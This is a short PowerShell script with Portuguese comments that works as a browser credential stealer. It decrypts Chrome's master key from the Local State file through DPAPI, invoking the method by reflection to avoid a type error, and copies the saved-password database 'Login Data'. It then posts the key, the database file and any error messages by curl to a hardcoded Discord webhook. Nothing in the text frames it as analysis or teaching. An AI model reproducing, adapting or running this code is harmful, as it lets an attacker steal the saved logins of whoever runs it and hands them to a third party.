$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"

# 1. Carrega a biblioteca de forma dinâmica para não dar erro de "TypeNotFound"
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Security.Cryptography")

function Get-Key {
    try {
        $lp = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
        if (!(Test-Path $lp)) { return "Chrome nao encontrado" }
        
        $j = Get-Content $lp -Raw | ConvertFrom-Json
        $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)[5..255]
        
        # 2. USA REFLEXÃO: Chama o método Unprotect sem citar o tipo diretamente no código estático
        $type = [Type]::GetType("System.Security.Cryptography.ProtectedData, System.Security, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")
        $method = $type.GetMethod("Unprotect", [type[]]@([byte[]], [byte[]], [System.Security.Cryptography.DataProtectionScope]))
        $m = $method.Invoke($null, @($e, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
        
        $k = [Convert]::ToBase64String($m)
        
        # Manda a chave
        curl.exe -X POST -F "content=CHAVE_MESTRE: $k" $u
        return $k
    } catch {
        # Se mesmo assim der erro, ele vai dizer exatamente onde foi
        $err = "ERRO: " + $_.Exception.Message
        curl.exe -X POST -F "content=$err" $u
        return $null
    }
}

function Get-DB {
    $db = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $t = "$env:TEMP\L"
    if (Test-Path $db) {
        Copy-Item $db $t -Force
        curl.exe -F "file=@$t" $u
    }
}

Get-Key
Get-DB
